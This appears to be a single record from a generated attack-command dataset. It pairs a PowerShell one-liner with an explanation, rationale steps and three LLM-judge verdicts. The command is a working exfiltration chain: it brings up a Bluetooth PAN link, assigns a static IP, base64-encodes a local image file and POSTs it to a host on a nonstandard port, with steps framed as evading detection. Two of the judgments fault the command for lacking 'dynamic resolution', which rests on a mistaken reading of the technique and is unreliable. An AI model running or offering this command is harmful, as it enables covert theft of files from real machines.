command: & 'C:\Tools\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name="$if" static 172.27.45.2 255.255.255.252 | Out-Null; $body=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\Public\Pictures\img1.png')); $ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri 'http://172.27.45.1:52873/u' -Method POST -Body $body -UseBasicParsing -Headers @{ 'X-T'='b' } | Out-Null
explanation: Uses Bluetooth PAN with a static IP and exfiltrates data via an HTTP POST to a custom port reachable only over the Bluetooth link (T1011).
rationale_steps: Activate NAP over Bluetooth as the alternate network medium.
Assign a restricted /30 IP on the Bluetooth interface with netsh.
Use HTTP on a high, nonstandard port to minimize detection.
Ensure destination is on the Bluetooth-only subnet to force egress via Bluetooth.

llm_judgments.syntactic_justification: The command is perfectly well-formed with balanced quotes, proper command separators, valid PowerShell syntax, and appropriate use of variables and pipeline operations.
llm_judgments.semantic_justification: The command correctly implements exfiltration over an alternative protocol (Bluetooth) by establishing a Bluetooth PAN connection, configuring a static IP, and sending base64-encoded file data via HTTP POST to a specific endpoint only accessible through that connection.

llm_judgments.syntactic_justification: The command is perfectly well-formed with correct Powershell syntax, balanced constructs, valid flag formats, and proper command separators.
llm_judgments.semantic_justification: The command utilizes static IP addresses for the Bluetooth link and C2 endpoint, which directly contradicts the 'dynamic resolution' characteristic of T1011.

llm_judgments.syntactic_justification: PowerShell command is well-formed with balanced quotes/braces, proper separators, and valid constructs; it should parse and run as written.
llm_judgments.semantic_justification: While it plausibly connects a Bluetooth PAN, sets a static IP, and exfiltrates via HTTP POST, it performs no dynamic resolution (no DNS/DGA/endpoint rotation) and thus does not implement the described T1011 behavior.
